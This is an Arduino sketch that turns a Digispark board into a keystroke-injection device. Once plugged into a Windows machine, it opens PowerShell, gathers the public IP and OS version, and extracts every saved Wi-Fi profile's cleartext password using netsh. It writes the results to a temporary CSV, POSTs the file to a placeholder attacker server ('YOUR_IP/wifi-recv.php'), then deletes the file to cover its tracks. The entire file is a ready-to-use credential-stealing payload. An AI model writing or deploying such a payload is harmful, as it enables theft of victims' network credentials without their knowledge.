#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT);  // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);

  // Open PowerShell from Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900); // wait for PS window

  // $csvPath = "$env:TEMP\temp.csv"
  DigiKeyboard.print(
    F("$csvPath = \"$env:TEMP\\temp.csv\"")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // $ip
  DigiKeyboard.print(
    F("$ip  = (Invoke-RestMethod -Uri \"https://api.ipify.org?format=json\").ip")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);

  // $os
  DigiKeyboard.print(
    F("$os  = (Get-CimInstance Win32_OperatingSystem).Caption")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);

  // $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(':')[1].Trim() }
  DigiKeyboard.print(
    F("$profiles = (netsh wlan show profiles) | Select-String \"All User Profile\" | ForEach-Object { $_.Line.Split(':')[1].Trim() }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // $now = Get-Date
  DigiKeyboard.print(
    F("$now = Get-Date")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  // $wifi = foreach($p in $profiles) {
  DigiKeyboard.print(
    F("$wifi = foreach($p in $profiles){")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  //   $dump = netsh wlan show profile name="$p" key=clear
  DigiKeyboard.print(
    F("$dump = netsh wlan show profile name=\\\"$p\\\" key=clear")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  //   $pass = $dump | Select-String "Key Content" | ForEach-Object { $_.Line.Split(':')[1].Trim() }
  DigiKeyboard.print(
    F("$pass = $dump | Select-String \"Key Content\" | ForEach-Object { $_.Line.Split(':')[1].Trim() }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  //   [PSCustomObject]@{ Time=...; SSID=...; Pass=...; IP=...; OS=... }
  DigiKeyboard.print(
    F("[PSCustomObject]@{ Time = $now.ToString(\"dd MMM yyyy, hh:mm:ss tt\"); SSID = $p; Pass = $pass; IP = $ip; OS = $os } }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  // $wifi | Export-Csv $csvPath -NoTypeInformation
  DigiKeyboard.print(
    F("$wifi | Export-Csv $csvPath -NoTypeInformation")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  // $b = Get-Content $csvPath -Raw
  DigiKeyboard.print(
    F("$b = Get-Content $csvPath -Raw")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b
  DigiKeyboard.print(
    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // Clean up: remove CSV and exit PowerShell
  DigiKeyboard.print(
    F("Remove-Item $csvPath -ErrorAction SilentlyContinue")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Blink LED forever to signal completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}
